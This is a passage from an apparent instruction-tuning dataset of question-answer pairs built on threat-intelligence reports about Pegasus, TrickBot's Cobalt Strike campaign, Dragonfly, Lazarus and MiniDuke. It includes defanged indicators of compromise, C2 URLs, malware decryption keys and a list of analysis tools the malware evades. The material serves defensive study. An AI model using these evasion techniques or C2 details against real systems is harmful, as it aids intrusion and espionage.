(Pegasus Anonymizing Transmission Network). The PATN appears to be a proxy chain system similar to (<https://citizenlab.org/2014/02/mapping-hacking-teams-untraceable-spyware/>)Hacking Team's anonymizers and (<https://citizenlab.org/2015/10/mapping-finfishers-continuing-proliferation/>)FinFisher's relays. The chain is intended to obfuscate the identity of the government client associated with a particular operation. Once the collected information arrives on the Pegasus Data Server, an operator may visualize the information on a Pegasus Working Station.\nThe implant in the attack targeting Mansoor communicated with two PATN nodes: aalaan.tv and manoraonline.net. The first of these, aalaan.tv, appears to be a lookalike domain for the legitimate (<http://www.alaan.tv/>)alaan.tv, a Gulf-based satellite television channel (see Section 5.2 for more details on lookalike domains observed in apparent NSO Group infrastructure).\nMedium Headline: 3.5. Prioritizing Stealth\nOne interesting design decision of NSO Group's Pegasus system, according to the purported NSO Group documentation, is that it emphasizes stealth above almost all else. As the documentation states:\nIn general, we understand that it is more important that the source will not be exposed and the target will suspect nothing than keeping the agent alive and working.\nCertain Pegasus features are only enabled when the device is idle and the screen is off, such as \"environmental sound recording\" (hot mic) and \"photo taking.\" The documentation also states that the spyware implements a \"self-destruct mechanism,\" which may be activated automatically \"in cases where a great probability of exposing the agent exists.\" However, the documentation claims that sometimes Pegasus removal can result in an infected device rebooting immediately after removal.\n\nHow does the Pegasus spyware prioritize stealth in its operations, and what mechanisms does it employ to ensure that the target remains unaware of the infection?",
    "output": "Pegasus prioritizes stealth above almost all else to ensure that the target remains unaware of the infection. Certain features, such as 'environmental sound recording' (hot mic) and 'photo taking,' are only enabled when the device is idle and the screen is off. Additionally, the spyware implements a 'self-destruct mechanism,' which can be activated automatically in cases where there is a high probability of exposing the agent. However, the documentation notes that sometimes Pegasus removal can result in an infected device rebooting immediately after removal. This emphasis on stealth is designed to prevent the target from suspecting anything and to protect the source from being exposed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: CERT-UA\nGeneral information:\nThe government's team for responding to computer emergencies in Ukraine CERT-UA revealed the fact of distribution of e-mails on the topic \"Urgent! . If you open the document and activate the macro, the macro will load, create and run the \"pe.dll\" file on disk. This will damage your computer with Cobalt Strike Beacon malware.\nWith a high level of confidence we can note that the file \"pe.dll\", as well as the file \"spisok.exe\" from message CERT-UA # 4464, is protected by a cryptocurrency related to the group TrickBot.\nThis activity is targeted and will be tracked by UAC-0098.\nCompromise indicators:\nFiles:\n877f834e8788d05b625ba639b9318512\nea9dae45f81fe3527c62ad7b84b03d19629014b1a0e346b6aa933e52b0929d8a Military on\nAzovstal.xls\ne28ac0f94df75519a60ecc860475e6b3\n9990fe0d8aac0b4a6040d5979afd822c2212d9aec2b90e5d10c0b15dee8d61b1 pe.dll (2022-04-15) a3534cc24a76fa81ce38676027de9533\n39a868e84524669491d6a251264144f0bfaca4f664d3fd10151854c341077262\nshellcode.bin.packed.dll eb18207d505a1de30af6c7baafd28e8e\nff30fdd64297ac41937f9a018753871fee0e888844fbcf7bf92bf5f8d6f57090 notevil.dll (CS Beacon)\nNetwork :\nhxxp: // 138 [.] 68.229.0 / pe.dll hxxps: // dezword [.] com / apiv8 / getStatus hxxps: // 84 [.] 32.188.29 138 [.] 68.229.0 dezword [.] com\n139 [.] 60,161,225\n139 [.] 60,161.74\n139 [.] 60.161.62\n139 [.] 60.161.99\n139 [.] 60.161.57\n139 [.] 60,161.75\n139 [.] 60.161.24\n139 [.] 60.161.89\n139 [.] 60,161,209\n139 [.] 60,161.85\n139 [.] 60,160.51\n139 [.] 60,161,226\n139 [.] 60,161,216\n139 [.] 60,161,163\n139 [.] 60,160.8\n139 [.] 60.161.32\n139 [.] 60,161.45\n139 [.] 60.161.60\n139 [.] 60,160.17\ndezword [.] com (2022-03-22) agreminj [.] com akaluij [.] com anidoz [.] com apeduze [.] com apocalypse [.] com arentuk [.] com axikok [.] com azimurs [.] com baidencult [.] com billiopa [.] com blinky [.] com blopik [.] com borizhog [.] com britxec [.] com drimzis [.] com fluoxi [.] com shikjil [.] com shormanz [.] com verofes [.] com\n/ apiv8 / updateConfig (Provider: @cherryservers [.] Com) (Provider: @hostkey [.] Com)\n\nQuestion: How does the TrickBot group leverage the use of macros in their phishing emails to distribute Cobalt Strike Beacon malware, and what are the key indicators of compromise associated with this activity?\n\nAnswer:",
    "output": "The TrickBot group distributes phishing emails with a topic such as 'Urgent!' that contain malicious documents. When the recipient opens the document and activates the macro, it loads, creates, and runs the 'pe.dll' file on the disk. This action infects the computer with Cobalt Strike Beacon malware. Key indicators of compromise include specific file hashes such as '877f834e8788d05b625ba639b9318512' for 'Military on Azovstal.xls' and 'a3534cc24a76fa81ce38676027de9533' for 'pe.dll'. Additionally, network indicators involve URLs like 'hxxp://138[.]68.229.0/pe.dll' and domains such as 'dezword[.]com' and 'agreminj[.]com', which are used for command and control communication.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Gannon, John C. 2001. The National Security Telecommunications and Information Systems Security Committee. Retrieved on February 12, 2008, from / speeches_telecommunications.html.\nGeneral Staff Department. 1997. Retrieved on March 20, 2008, from .\nGOA. 1996. Information Security: Computer Attacks at Department of Defense Pose Increasing Risks. Retrieved on February 5, 2008, from 96084.htm.\nGoodin, Dan. 2008. India and Belgium Decry Chinese Cyber Attacks. Retrieved on June 10, 2008, from /.\nGoogle censors itself for China. 2006. Retrieved on July 22, 2006, from . uk/2/hi/technology/4645596.stm.\nGraham, Bradley. 2005. Hackers Attack Via Chinese Websites. Retrieved on January 8, 2008, from 24/AR2005082402318.html.\nGreenberg, Andy. 2007. Apples For The Army. Retrieved on January 20, 2008, from ity-cx_ag_1221army.html.\nGreenberg, Andy. 2007. Worst Cybersecurity Meltdowns. Retrieved on February 18, 2008, from 1026worsthacks.html.\nGreenemeier, Larry. 2007. China's Cyber Attacks Signal New Battlefield Is Online. Retrieved on July 7, 2008, from cyber-attacks-sign.\nGrier, Peter. 2005. Spy Case Patterns The Chinese Style of Espionage. Retrieved on March 23, 2008, from .\nGriggs, Brandon. 2008. US at risk of Cyberattacks, Experts Say. Retrived on August 25, 2008, from .\nHacker Attacks in US Linked to Chinese Military. 2005. Retrieved on July 21, 2006, from .\nHacking Textfiles. 2008. Retrieved on June 8, 2008, from .\nHacking US Government Computers from Overseas. 2001. Retrieved on February 2, 2008, from .\nHanson, Stephanie. 2008. China, Africa, and Oil. Retrieved on June 12, 2008, from .\nHa, Michael. 2008. China Gateway for Most Cyber-Attacks. Retrieved on June 20, 2008, from .\nHeilemann, John. 2006. How Digg.com is Democratizing the News. Retrieved on March 27, 2007 from diggdemocratizes/index.htm.\nHershkovitch, Ady. 1998. Plasma Window Technology for Propagating Particle Beams and Radiation from Vacuum to Atmosphere. Retrieved on March 10, 2008, from .\nHi-tech Thieves Target Olympics. 2008. Retrieved on August 20, 2008, from .\nHill, John. 2004. China's Assassin's Mace Meets The Taiwanese Scorpion. Retrieved on March, 18, 2008, from &name=News&file=article&sid=1044.\nHines, Matt. 2008. Be prepared: ActiveX attacks will persist. Retrieved on March 10, 2008, from .\nHollis, Duncan. Why States Need an International Law For Information Operations. Retrieved on March 2, 2008, from id=1083889.\nIkenberry, John G. 2008. The Rise of China and the Future of the West. Retrieved on February 10, 2008, from john-ikenberry/the-rise-of-china-and-the-future-of-the-west.html.\nIndonesia: Growing Fuel Price Protest Meet Repression. 2008. Retrieved on August 1, 2008, from .\nInformation Operations Roadmap. 2003. Declassified US Government document. Retrieved on March 1, 2008, from f.\nInternational Assessment and Strategy Center. 2005. Top Ten Chinese Military Modernization Developments. Retrieved on February 15, 2008, from .\nInternational Institute for Strategic Studies. 2008. The Military Balance 2008. Routledge for IISS, Abingdon.\nInternet censorship in the People's Republic of China. 2006. Retrieved on August 2, 2008, from\nInternet Filtering in China in 2004-2005. 2005. Retrieved on July 21, 2008, from .\nInternet Group Declares War on Scientology. Retrieved on March 8, 2008, from .\nIran Missile Test Provocative. 2008. Retrieved on August 2, 2008, from .\nIsachenkov, Vladimir. 2007. Russian Space Exec Convicted For Aiding China. Retrieved on March 10, 2008, from .\nISN. 2001. Code Red virus probably began in China. Retrieved on July 18, 2006, from .\nJesdanun, Anick. 2008. Chinese Internet Users Up to 210 Million. Retrieved on February 20, 2008, from .\nJohnston, Alastair. 2002. Toward Contextualizing the Concept of a Shashoujian (Assassin's Mace). Retrieved on February 24, 2008, from ston/shashoujian.pdf.\nJordan, Jakes. 2008. US Charges 2 In China Spy Case. Retrieved on April 1, 2008, from .\nKiezer, Gregg. 2005. Dutch Botnet Suspects Ran 1.5 Million Machines. Retrieved on August 1, 2008, from .\nKerner, Sean. 2007. Estonia Under Russian Cyber Attack? Retrieved on February 19, 2008, from .\nKlein, Alec. 2007. The Army's $200 Billion Makeover. Retrieved on March 10, 2008, from tml.\nKumar, T. 2006. Human Rights and the Internet in China. Retrieved on August 4, 2008, from .\nLam, Willy Wo-lap. 2004. Beijing's New \"Balanced\" Foreign Policy: An Assessment. China Brief, Vol. 4, No. 4, 20 February. The Jamestown Foundation, Retrieved on February 6, 2006, from 2\nLandler, Mark and Markoff, John. 2007. Digital Fears Emerge After Data Siege in Estonia Retrieved on February 2, 2008, from 29estonia.html?_r=2&ref=technology&oref=slogin&oref=slogin.\nLasker, John. 2005. US Military's Elite Hacker Crew. Retrieved on February 18, 2008, from .\nLayer 8. 2007. Did her MySpace photo derail teacher's career? Retrieved on June 18, 2008, from .\nLemon, Sumner. 2008. China Crafts Cyber Weapons. Retrieved on June 2, 2008, from .\nLemon, Sumner. 2007. Chinese Police Arrest Eight For Computer Virus. Retrieved on March 20, 2008, from .\nLewis, Jeffrey. 2005. Autonomous Nanosatellite Guardian For Evaluating Local Space (ANGELS). Retrieved on March 10, 2008, from archives/001996.html.\nLewis, Peter. 1994. Computer Snoopers Imperil Pentagon Files, Experts Say. Retrieved on July, 2, 2008, from 932A15754C0A962958260.\nLeyden, John. 2007. France blames China for hack attacks. Retrieved on January 2, 2008, from .\nLeyden, John. 2004. Telenor Takes Down Massive Botnet. Retrieved on August 1, 2008 from .\nLeyden, John. 2001. Code Blue Targets Red China. Retrieved on July 18, 2006, from .\nLevinson, Charles. 2008. Hackers Attack Iraq's Vulnerable Computers. Retrieved on August, 25, 2008, from .\nLiedtke, Michael. 2005. Google Agrees to Censor Results in China. Retrieved on July 22, 2006, from .\nList of Internet Phenomena. 2008. Retrieved on April 10, 2008, from .\nLo, Joseph. 1996. Internet Chat Relay FAQ. Retrieved on March 15, 2006, from .\nLuard, Tim. 2005. China's Spies Come Out From The Cold. Retrieved on April 2, 2008, from .\nLynch, David. 2007. Law Enforcement Struggles To Combat Chinese Spying. Retrieved on March 23, 2008, from 1_N.htm.\nMalone, Scott. 2008. Hackers stole 40 million credit card numbers. Retrieved on August 10, 2008, from .\nMarshall, Matt. 2008. Xiaonei, The Facebook Of China, Raises $430M. Retrieved on April 2, 2008, from better-funded-than-facebook/.\nMagnuson, Stew. 2006. Wikipedia for Intel Officers Proves Useful. Retrieved on July 7, from 1.html.\nMao, Tse-Tung [Zedong]. 2000. On Guerrilla Warfare (trans. Samuel B. Griffith). Chicago: University of Illinois Press\nMark, David. 2008. Scientists one step closer to invisibility cloak. Retrieved on August 12, 2008, from .\nMarquand, Robert. 2007. China Emerges As Leader In Cyber Warfare. Retrieved on April, 10, 2008, from .\nMarsal, Katie. 2008. China asking Apple to intentionally cripple iPhones. Retrieved on September 26, 2008, from asking_apple_to_intentionally_cripple_iphones.html.\nMaynor, David and Graham, Robert. 2006. SCADA Security and Terrorism: We're Not\nCrying Wolf. Retrieved on February 27, 2008, from presentations/bh-federal-06/BH-Fed-06-Maynor-Graham-up.pdf.\nMcLaughlin, Martin. 1999. China Spy Scare. Retrieved on March 23, 2008, from .\nMcLean, Doug. 1995. Hacking in 17 Easy Steps. Retrieved on January 15, 2008, from / hacking/17steps.shtml.\nMcMillan, Robert. 2008. CIA Says Hackers Have Cut Power Grid. Retrieved on January 19, 2008, from .\nMcMillan, Robert. 2008. Hackers Hit Scientology With Online Attack. Retrieved on July 14, 2008, from online_attack.html.\nMcMillan, Robert. 2007. Couple Swarmed By SWAT Team After 911 Hack. Retrieved on June 7, 2008, from .\nMiklaszewski, Jim. 1999. Pentagon and Hackers in Cyberwar. Retrieved on February 2, 2008, from .\nMilchman, Eli. 2006. Yahoo 'Strictest' Censor in China.Retrieved on July 15, 2006, from .\nMiller, Chuck 2008. The Rustock botnet spams again, SC Magazine July 25, from\nMinistry of Internal Affairs Lists PMR's 10 Most Wanted. 2007. Retrieved on March 10, 2008, from ists_pmrs_10_most_wanted.html.\nMissiles and Space Programme. 2008. Retrieved on March 20, 2008, from\nMoore, Frank W. China's Military Capabilities. 2000. Retrieved on February 18, 2008, from .\nMoss, William. 2006. Chinese YouTubes courting controversy. Retrieved on July 20, 2006, from ,39375940,00.htm.\nMusharbash, Yassin. 2008. Insights Into The Cyber-Jihad. Retrieved on August 30, 2008, from .\nNavrozov, Lev. 2005. Chinese Geostrategy: The Assassin's Mace. Retrieved on February 10, 2008, from .\nNewhouse, Barry. 2006. Group Accuses Internet Companies in China of Rights Violations. Retrieved on July 21, 2006, from -07-20-voa16.cfm.\nNew Technology Can Be Operated By Thought. 2007. Retrieved on March 10, 2008, from .\nNock, Howard and Lizun, Daniel. 2007. Cyberterrorism and Cybercrime: Are You Prepared. Retrieved on January 28, 2008, from / v3n2.htm.\nNorton-Taylor, Richard. 2007. Titan Rain: How Chinese Hackers Targeted Whitehall. Retrieved on January 8, 2008, from / sep/04/news.internet.\nNuclear Electromagnetic Pulse. 2005. Retrieved on August 23, 2008, from .\nO'Brien, Kevin. 2008. OLPC XO Review and Teardown. Retrieved on January 14, 2008, from 9.\nO'Connell, Kelly. 2008. Internet Law: Hackers Disable Scientology Website & Declare War. Retrieved on July 14, 2008, from . aspx?s=latestnews&id=1972.\nOf Cables and Conspiracies. 2008. Retrieved on July 4, 2008, from .\nOliver, Chris. 2008. China's foreign exchange reserves jump 61.6 bln in January. Retrieved on March 13, 2008, from exchange-reserves-jump/story.aspx?guid=%7BEBE6E206-9BE9-4329-B71A- 2AF2F903A5AD%7D.\nOnley, Dawn and Wait, Patience. 2006. Red Storm Rising. Retrieved on January 8, 2008, from .\nOperation Spam Zombies. 2005. Retrieved on August 1, 2008, from conline/edcams/spam/zombie/partners.htm.\nPang, Kevin. 2008. Chinese text-message primer. Retrieved on August 25, 2008, from http:// .\nQuestion: What specific examples does the report cite to illustrate China's involvement in cyber attacks against other nations?",
    "output": "Answer: The report cites several examples, including incidents where India and Belgium decried Chinese cyber attacks. It also mentions reports of hackers attacking via Chinese websites and China being identified as a gateway for most cyber-attacks. These examples highlight China's active role in cyber operations targeting various countries.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Timeline\nFigure 1. Timeline of Dragonfly operations\nSymantec observed spear phishing attempts in the form of emails with PDF attachments from February 2013 to June 2013. The email topics were related to office administration issues such as dealing with an account or problems with a delivery. Identified targets of this campaign were mainly US and UK organizations within the energy sector.\nIn May 2013, the attackers began to use the Lightsout exploit kit as an attack vector, redirecting targets from various websites. The use of the Lightsout exploit kit has continued to date, albeit intermittently. The exploit kit has been upgraded over time with obfuscation techniques. The updated version of Lightsout became known as the Hello exploit kit.\nA newer approach used by the attackers involves compromising the update site for several industrial control system (ICS) software producers. They then bundle Backdoor.Oldrea with a legitimate update of the affected software. To date, three ICS software producers are known to have been compromised.\nThe Dragonfly attackers used hacked websites to host command-and-control (C&C) software. Compromised websites appear to consistently use some form of content management system.\n\nWhy did the Dragonfly attackers shift their tactics from using spear phishing emails with PDF attachments to compromising ICS software update sites? How does this change in strategy impact the effectiveness of their operations against Western energy suppliers?",
    "output": "The Dragonfly attackers shifted their tactics from using spear phishing emails with PDF attachments to compromising ICS software update sites to enhance the effectiveness and stealthiness of their operations. Initially, from February 2013 to June 2013, they employed spear phishing attempts via emails with topics related to office administration, targeting primarily US and UK organizations within the energy sector. However, starting in May 2013, they introduced the Lightsout exploit kit, which was later upgraded to the Hello exploit kit with improved obfuscation techniques. This shift allowed them to redirect targets from various websites, providing a more sophisticated attack vector. Furthermore, the attackers began compromising the update sites of several industrial control system (ICS) software producers, bundling Backdoor.Oldrea with legitimate software updates. This tactic enabled them to infiltrate systems more covertly and potentially gain access to critical infrastructure. By leveraging compromised websites to host command-and-control (C&C) software, particularly those using content management systems, the attackers could maintain persistent control over their targets. This evolution in strategy demonstrates the group's adaptability and their focus on evading detection while maintaining access to high-value targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Loader\nThis component is a Themida-protected file. We estimate the version of Themida to be 2.0-2.5, which agrees with KrCERT's report (page 20). The Loader serves as a simple injector that is looking for its injection parameters in the resources: the name of the encrypted file and the decryption key, which is the string \"542\". The instance delivered by the dropper looks for the file bcyp655.tlb (the Downloader). It creates a mutex Global\\RRfreshRA_Mutex_Object. The choice of the targeted service and the injection method are the same as in the dropper.\nLet us talk for a while about the encryption method used by the dropper and by this loader. The common key is the string \"542\", which is initially provided as a command-line parameter to the Dropper and subsequently as a 3-byte encrypted resource for the Loader. To expand a short master key to a larger expanded key (so-called key scheduling), the MD5 hash of the string is computed, which is 7DCD340D84F762EBA80AA538B0C527F7. Then it takes first three double words, let's\ndenote them A := 0x7DCD340D, B := 0x84f762EB, C:= 0xA80aa538. The length of an encrypted buffer is divided by 3, and this is the number of iterations that transforms the initial sequence (A,B,C) into the proper key. In every iteration (X,Y,Z) becomes (X^Y, Y^Z, X^Y^Z). Because the XOR operation (denoted ^) is commutative and transitive, and its square is zero, which leaves everything unchanged, we can compute that after 8 iterations we get the identity, so the key could reach just 7 pairwise different states and is equal to the first 12 characters of the MD5 hash of \"542\" if the length is a multiple of 24.\nWhat is interesting is how the remainder of the length division by 3 is treated. If the number of iterations was increased by this remainder, then we would reach just another of the 7 states of the key. However, the twist is in the change of operation: ^ is replaced with the OR operation in the code for the remainder. For example, the key with the remainder 1 becomes {FE F7 3A F9 F7 D7 FF FD FF F7 FF FD} for one of the states (of (C, A^B, B^C) to be precise), so we get new possible transformations of the key that tend to be more likely to be ones than zeroes.\nThat was the part preparing the key. The encryption algorithm itself looks like  at first glance. It was a secret technology developed in 1987 and used in over-the-air communication privacy in the GSM cellular telephone standard until reverse-engineered in 1999. The crucial part of the algorithm is three linear feedback shift registers (LFSRs). However, only the lengths of LFSRs in the malware code coincide with the official implementation, not the constants.\nTable 2. Comparison of crypto algorithms between malware and the official implementation\nThe decryption loop in each iteration basically derives a 1-byte XOR key for the corresponding byte of the encrypted buffer. The purpose of LFSRs is that they could transform the key, so the whole process is much more complicated. But due to the mentioned change of the operation, LFSRs would not affect it and the 1-byte XOR key remains the same for all iterations.\nMedium Headline: Downloader, aka WinHttpClient\nThe main downloader is dropped by the Dropper component under the bcyp655.tlb name and injected into one of the services by the Loader. Its main purpose is to deliver additional stages onto the victim's computers. The network protocol is based on HTTP but requires several stages to establish a trusted connection.\nThe malware fingerprints the victim's system: see Figure 9.\nThe first step is authorization. After sending randomly generated, generic parameters code and id, the expected response starts with <!DOCTYPE HTML PUBLIC Authentication En> followed by additional data delimited by a semicolon. However, in the next POST request the parameters are already based on the victim's IP. Because we didn't know which victims were targeted, during our investigation, we always received a \"Not Found\" reply, not the successful \"OK\".\nIf the victim passes these introductory messages and the connection is acknowledged, then the decrypted response starts with an interesting artifact: a keyword ohayogonbangwa!!. As a whole, we haven't found that word on the internet, but the closest meaning could be \"Ohayo, Konbangwa\" (\u304a\u306f\u3088\u3046\u3053\u3093\u3070\u3093\u3050\u3041), which is \"Good morning, good evening\" in Japanese. From this point, there are more messages that are exchanged, with the final exchange asking for an executable to load into memory.\nBig Headline: Conclusion\nAttackers are constantly trying to find new ways to deliver malware to target computers. Attackers are particularly interested in supply-chain attacks, because they allow them to covertly deploy malware on many computers at the same time. In recent years ESET researchers analyzed such cases as , (<https://www.welivesecurity.com/2017/10/20/osx-proton-supply-chain-attack-elmedia/>)Elmedia Player, , , and the (<https://www.welivesecurity.com/2019/03/11/gaming-industry-scope-attackers-asia/>)gaming industry. We can safely predict that the number of supply-chain attacks will increase in the future, especially against companies whose services are popular in specific regions or in specific industry verticals.\nThis time we analyzed how the Lazarus group used a very interesting approach to target South Korean users of WIZVERA VeraPort software. As mentioned in our analysis, it's the combination of compromised websites with WIZVERA VeraPort support and specific VeraPort configuration options that allow attackers to perform this attack. Owners of such websites could decrease the possibility of such attacks, even if their sites are compromised, by enabling specific options (e.g. by specifying hashes of binaries in the VeraPort configuration).\nSpecial thanks to D\u00e1vid G\u00e1bri\u0161 and Peter Ko\u0161in\u00e1r.\nFor any inquiries, or to make sample submissions related to the subject, contact us at threatintel@eset.com\nBig Headline: References\nKrCERT/CC, \"(<https://www.boho.or.kr/filedownload.do?attach_file_seq=2452&attach_file_id=EpF2452.pdf>)Operation BookCodes TTPs#1 Controlling local network through vulnerable websites\", English Translation, 1st April 2020\nKrCERT/CC, \"(<https://www.boho.or.kr/filedownload.do?attach_file_seq=2455&attach_file_id=EpF2455.pdf>)Operation BookCodes TTPs#2 \uc2a4\ud53c\uc5b4 \ud53c\uc2f1\uc73c\ub85c \uc815\ubcf4\ub97c \uc218\uc9d1\ud558\ub294 \uacf5\uaca9\ub9dd \uad6c\uc131 \ubc29\uc2dd \ubd84\uc11d\", Korean, 29th  June 2020\nP. K\u00e1lnai, M. Poslu\u0161n\u00fd: \"\", Virus Bulletin 2018 (Montreal)\nP. K\u00e1lnai: \"\", WeLiveSecurity, February 2017\nP. K\u00e1lnai, A. Cherepanov \"\", WeLiveSecurity, April 2018\nD. Breitenbacher, K. Osis: \"(<https://web-assets.esetstatic.com/wls/2020/06/ESET_Operation_Interception.pdf>)Operation In(ter)ception: Aerospace and military companies in the crosshairs of cyberspies\", June 2020\nNovetta et al, \"\", February 2016,\nMarcus Hutchins, \"\",  May 2015\nKaspersky GReAT: \"\", July 2020\nA. Kasza: \"\", Palo Alto Networks, August 2017\nUS-CERT CISA,\nWeLiveSecurity: \"\", December 2014\nR. Sherstobitoff, I. Liba. J. Walter: \"(<https://www.mcafee.com/enterprise/en-us/assets/white-papers/wp-dissecting-operation-troy.pdf>)Dissecting Operation Troy: Cyberespionage in South Korea\", McAfee\u00ae Labs, May 2018 McAfee Labs: \"(<https://www.mcafee.com/https://web-assets.esetstatic.com/wls/2011/07/McAfee-Labs-10-Days-of-Rain-July-2011.pdf>)Ten Days of Rain\", July 2011\nFireye/Mandiant: \"(<https://www.fireeye.com/blog/threat-research/2017/09/north-korea-interested-in-bitcoin.html>)Why Is North Korea So Interested in Bitcoin?\", September 2017 Choe Sang-Hun: \"(<https://www.nytimes.com/2013/03/21/world/asia/south-korea-computer-network-crashes.html>)Computer Networks in South Korea Are Paralyzed in Cyberattacks\", March 2013 A5/1 stream cipher, (<https://en.wikipedia.org/wiki/A5/1>)Wikipedia\n\nQuestion: How does the Loader component of the Lazarus group's toolset utilize Themida protection and what role does it play in the overall infection chain?\n\nAnswer:",
    "output": "The Loader component is protected using Themida, estimated to be version 2.0-2.5. It acts as a simple injector that searches for its injection parameters within the resources, specifically the name of the encrypted file and the decryption key, which is the string '542'. The Loader delivered by the dropper looks for the file bcyp655.tlb (the Downloader) and creates a mutex named Global\\\\RRfreshRA_Mutex_Object. The targeted service and the injection method are consistent with those used by the dropper.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Backdoor analysis\nThe backdoor has a single export, which for instance is named \"JorNgoq\" in the Hungarian case. When this export is called at load, the backdoor sets the \".rdata\" section's permissions to \"RWX\" and sets the mutex to a hardcoded string \"nljhfdb\".\nThe entrypoint of the library (DllMain) is obfuscated and the main body of the malware is encrypted. The encryption is rather simple: the \".rdata\" section of the library is ROL'ed with a linear key and XOR'ed with a fixed key. Both keys are derived from the length of the encrypted part.\nDecryption loop in the obfuscated code. 0x4522 is the actual size of the encrypted part\nOnce finished decrypting, the library proceeds to the real \"main\" function. The main part of the library is written in Assembler, in an \"old-school\" manner typical for low-level viruses. The code is position independent; it has no imports and resolves API function addresses by hash values of their names.\nTypical low-level malware programming style: passing strings as parameters via call, addressing API functions by hash values\nThe backdoor maintains seven call addresses that each maintain their own block of functionality.\nThe first block calls GetAsyncKeyState twice, checking for a mouse click, which indicates user activity in the system. The second block searches for all \"*.exe\" and \"*.dll\" files located in the %temp% directory. The third block fetches information about the infected system with calls to gather information about the CPU, drive and the computername - these are used to decrypt the backdoor's main body, which is custom encrypted for each unique victim.\nThe fourth block attempts to maintain self-protection from malware analysis. Below is the list of tools (and VMware) that it attempts to identify and protect against. It fetches the list of running processes on the system and attempts to identify if these tools are among them:\napispy32.exe, apimonitor.exe, winapioverride32.exe, procmon.exe, filemon.exe, regmon.exe, winspy.exe, wireshark.exe, dumpcap.exe, tcpdump.exe, tcpview.exe, windump.exe, netsniffer.exe, iris.exe, comview.exe, ollydbg.exe, windbg.exe, odb.exe, ImmunityDebugger.exe, syser.exe, idag.exe, idag64.exe, petools.exe, vboxtray.exe, vboxservice.exe, procexp.exe, vmtools.exe, vmwaretray.exe, vmwareuser.exe\nIf any of the tools above are detected on the system, the malware will continue running on the system without further decrypting its code and exhibiting any other functionality. This will prevent it from doing any outbound communications with Twitter accounts, as described below. In other words, it will attempt to appear non-functional, especially to automated analysis, hiding its true nature behind its layers of encryption.\nUser agent strings for web browsers like Opera, Mozilla and Internet Explorer are decrypted and used for all Internet access. Oddly, there are Linux versions included as well:\n(Windows NT 5.1; (Windows NT 6.0; (Windows; U; Windows NT 5.2; (X11; Linux i686; (X11; Linux x86_64; (compatible; MSIE 6.0; Windows NT 5.0; (compatible; MSIE 7.0; Windows NT 6.0; (compatible; MSIE 9.0; Windows NT 6.1;WOW64) ;Trident/4.0) ; Trident/5.0) ; WOW64; Trident/5.0) ; SV1) )\nThe fifth and sixth code blocks are most interesting. They calculate the SHA1 of main system information which will be used in the C2 interaction later.\nFollowing the SHA-1 hash generation, the backdoor will base64 encode its unique hash for later C2 communication.\nThe malware is activated upon reboot of the infected machine. To gain control at boot, it writes a randomly named LNK file to the startup folder, which in turn calls the main body using rundll32:\nIn the picture above, the malware's main body is stored as \"stat.bin\" (a randomly selected name) in the \"Adobe\" folder. The LNK file calls it only exported function, \"ImqRgno\".\nOnce activated, the malware will first contact Twitter and look for posts from some very specific accounts. These accounts should have posted an encrypted string which contains the magic identifier \"uri!\", then an encrypted c2 string.\nWe presume many other Twitter accounts exist with similar parameters.\nThe encrypted \"uri!\" holds a different c2 for each version of the malware:\nIt's most likely that these websites have been hacked by the attackers and injected with the command and control PHP script.\nSecondly, the malware will connect to \"\" to obtain information about the victim's location.\nInterestingly, the backdoor has another update/c2 functionality. It searches Google for a very specific string:\nThe string \"lUFEfiHKljfLKWPR\" which the malware seeks on Google\nThe pages found by the Google search may hold an update \"uri\" similar to the one from Twitter. We can assume the attackers wanted to have a second channel for updates in case the Twitter accounts are closed.\nBig Headline: Stage 2\nThe \"index.php\" on the C2 serves a fake GIF file to the victim, depending on the parameters it receives. Here's what one of these GIF files looks like:\nHere's one example of a malicious request for the C2 domain \"arabooks*dot+ch\":\narabooks.ch/lib/index.php?ia=TJ2b7uzMuh4fnt2n7aJisckAj6pEvkLPPsmk5gC77rPeYKmj8z58UWS1szY0FGzkp[REMOVED]lhUDx vzo1_IpYHfDI2MTg2NTM5OTF8MS4xMw==\nThe picture from the GIF file is actually very small and reminds us of the method used by Duqu back in 2011 to hide data, known as 'steganography':\nAt offset 0x6a4 inside the GIF file, there is a hidden encrypted PE file. The encryption scheme used a DWORD key also stored in the GIF file that is rotated. Effectively, this translates to an 8 byte long XOR key. The resulting encryption key used in the Hungarian attack for instance is {0xD2, 0x2A, 0xA2, 0x27, 0x79, 0x95, 0x52, 0x2D}. In the Belgian attack, it is {0xC5, 0x5E, 0xEE, 0xE5, 0x51, 0x11, 0x17, 0x7C}. For the Luxemburg attack, the key is {0x91, 0x18, 0x8C, 0xC1, 0x1C, 0xC9, 0x9C, 0xC9}.\nDecrypted payload from the fake GIF file served by the C2\nThe decrypted PE file (plugin / payload) is also written in assembler and, once again, it is encrypted with the same algorithm as the backdoor originally deployed in the system. We refer to it as \"stage 2\". The main backdoor body saves the plugin with different names, for instance, it can be \"xml.dat\" and tries to run its only export using rundll. In our case, this didn't appear to work very well:\nSeveral different variants of the 2nd stage backdoors have been observed on the C2; they all perform similar functions but are encrypted with different keys and contact different C2s.\nMedium Headline: Command & control server information\nThe malware connects to several C2s depending on the information available on the control Twitter accounts or on Google. For instance, on \"artas*dot+org\" it connects to \"/engine/index.php\". Interestingly, the \"img\" subfolder allows listings and we can see several variants of the backdoor encrypted as GIF files:\nOn \"tsoftonline*dot+com\", the folder has the same structure:\nInterestingly, on \"tsoftonline*dot+com\" we have several other files with different kind of names and sizes. They are larger and follow a different naming scheme: \"*number+.gif\". We believe they are custom backdoors delivered only to specific victims by the attackers. We refer to these as \"stage 3\".\nBig Headline: Stage 3\nWhile we were analyzing the samples, the attackers connected to the C2 and added a custom backdoor as \"1109821546.gif\":\n\"http://tsoftonline.com/views/img/1109821546.gif\"\nHTTP/1.1 200 OK\nDate: Mon, 25 Feb 2013 12:34:13 GMT\nServer: Apache\nMon, 25 Feb 2013 10:59:49 GMT\nLast-Modified:\nETag: \"7c8251-5190d-4d68a708d9340\"\nAccept-Ranges: bytes\nContent-Length: 334093\nContent-Type: image/gif\nThis custom backdoor, referred to as \"stage 3\", is much bigger than the previous ones \u2013 300K+ in size. This is because the attackers used large layers of obfuscation code, including UCL compression. So far, we have observed two variants of the 300K \"stage 3\" backdoor. The PE compilation timestamp for both is \"Mon Jun 18 